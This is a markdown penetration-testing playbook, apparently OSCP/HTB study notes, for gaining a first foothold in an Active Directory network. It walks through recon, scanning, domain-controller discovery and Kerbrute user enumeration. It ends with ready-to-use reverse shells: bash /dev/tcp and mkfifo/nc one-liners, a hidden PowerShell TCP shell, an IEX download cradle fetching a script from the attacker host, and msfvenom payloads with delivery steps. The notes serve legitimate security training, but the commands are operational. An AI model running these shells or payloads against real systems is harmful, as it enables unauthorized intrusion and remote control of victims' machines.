# 1 · Foothold

> **Goal:** get a first shell / initial position on the network, and enumerate the domain
> *before* you have any credentials. Corresponds to phase **1 · get a foothold** on the
> attack journey map (sections: initial access, external recon, initial enum).
>
> Condensed from `htbad/` (01, 04, 05) and `offad/`. `{{VAR}}` placeholders are filled by
> [WorkflowHelper.html](../WorkflowHelper.html).

---

## Initial access

Once you have a host + credentials (from the client, breach data, or a prior step):

```shellsession
# RDP
xfreerdp3 /cert:ignore /v:{{TARGET_IP}} /u:{{USERNAME}} /p:{{PASSWORD}}

# SSH
ssh {{USERNAME}}@{{TARGET_IP}}

# WinRM (once you have creds/hash — see later phases)
evil-winrm -i {{TARGET_IP}} -u {{USERNAME}} -p {{PASSWORD}}
```

> Landed as a **low-priv local user**? Local Windows privilege escalation is the common bridge to
> the credential-theft steps later — dumping LSASS needs admin/SYSTEM. Playbook:
> [`../privilege/windows.md`](../privilege/windows.md) (and [`linux.md`](../privilege/linux.md) for *nix hosts).

---

## External recon (before you touch the network)

DNS — resolve the org's name servers / public hosts:

```shellsession
nslookup ns1.{{DOMAIN}}
nslookup ns2.{{DOMAIN}}
```

Breach / OSINT data — hunt for already-leaked corp credentials (Dehashed, etc.):

```shellsession
sudo python3 dehashed.py -q {{DOMAIN}} -p
```

> Also useful: LinkedIn/hunter.io for a name list → feed into the user-list builder in phase 2.

---

## Passive network recon (from an internal foothold, no creds)

Just listen — see hostnames, domains, and who's talking on the wire:

```bash
sudo tcpdump -i tun0
```

Responder in **analyze** mode (`-A` = passive, does NOT poison — safe first look):

```bash
sudo responder -I tun0 -A
```

---

## Host discovery & port scanning

```bash
# sweep the subnet for live hosts
fping -asgq {{SUBNET}}

# full scan of discovered hosts
sudo nmap -v -A -iL hosts.txt -oN host-enum
nmap -A {{TARGET_IP}}
```

---

## Find the domain controller

> 90% shortcut: in an AD domain the box's **DNS server = the DC**. `ipconfig /all` (Windows) or
> `/etc/resolv.conf` (Linux) usually hands you the DC IP; `nltest`/`LOGONSERVER` confirm by name.

### From a Windows foothold

```cmd
echo %LOGONSERVER%                        :: DC that logged you in (\\DCNAME)
nltest /dsgetdc:{{DOMAIN}}                :: DC name + IP + site
nltest /dclist:{{DOMAIN}}                 :: list ALL DCs
systeminfo | findstr /B /C:"Domain"       :: confirm domain name
ipconfig /all                             :: DNS server ~= the DC
nslookup -type=srv _ldap._tcp.dc._msdcs.{{DOMAIN}}
```

```powershell
$env:LOGONSERVER
Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.{{DOMAIN}}
```

### From a Linux foothold

```bash
cat /etc/resolv.conf                      # nameserver is usually the DC
nslookup -type=SRV _ldap._tcp.dc._msdcs.{{DOMAIN}}
dig SRV _ldap._tcp.dc._msdcs.{{DOMAIN}}
```

---

## Pre-cred user enumeration

### Kerbrute — validate usernames with no auth (Kerberos pre-auth)

```bash
# one-time install
sudo git clone https://github.com/ropnop/kerbrute.git && cd kerbrute && sudo make all
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# enumerate valid domain users from a wordlist
kerbrute userenum -d {{DOMAIN}} --dc {{DC_IP}} {{USERLIST}} -o valid_ad_users
```

### SPN enumeration (Windows LOLBIN — no tools to drop)

> Built-in `setspn.exe`; works from any domain context (domain user, or SYSTEM on a domain host).

```cmd
setspn.exe -T {{DOMAIN}} -Q */*            :: list every SPN in the domain
setspn.exe -Q {{SPN}}                      :: which account owns a specific SPN
```

Pure-LDAP alternative (no RSAT):

```powershell
([adsisearcher]'(servicePrincipalName={{SPN}})').FindAll().Properties.samaccountname
```

---

## Reverse shells (reference)

> `{{LHOST}}` = attack box IP, `{{LPORT}}` = listener port.

```shellsession
# listener (attacker)
nc -lvnp {{LPORT}}
```

```bash
# bash (target)
bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
# if /dev/tcp is unavailable, use a named pipe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f
```

```powershell
# PowerShell one-liner (target)
powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"

# Or https://www.revshells.com/ , powershell #3 
```

> **Web-shell gotcha (Antak/Nishang):** input runs inside an already-live runspace — drop the
> `powershell -nop -c "..."` wrapper or `$c`, `$s` blank out. Paste the raw one-liner, or use a
> download cradle:
>
> ```powershell
> IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}
> ```

### Standalone payloads (msfvenom)

> `shell_reverse_tcp` = **plain** (non-staged, non-Meterpreter) reverse shell — catch it with
> the same `nc -lvnp {{LPORT}}` listener above, no `multi/handler` needed. Meterpreter payloads
> carry the same OSCP restriction as Metasploit itself, so stick to `shell_reverse_tcp` here.

```bash
# Windows — .exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o shell.exe
# Windows 32-bit target
msfvenom -p windows/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o shell.exe

# Linux — ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf -o shell.elf
# Linux 32-bit target
msfvenom -p linux/x86/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf -o shell.elf
```

> Serve the payload (`python3 -m http.server 80`), pull it onto the target (`certutil`/`wget`),
> mark it executable on Linux (`chmod +x shell.elf`), then run it while your `nc` listener waits.
> List payloads/formats: `msfvenom --list payloads` · `msfvenom --list formats`.
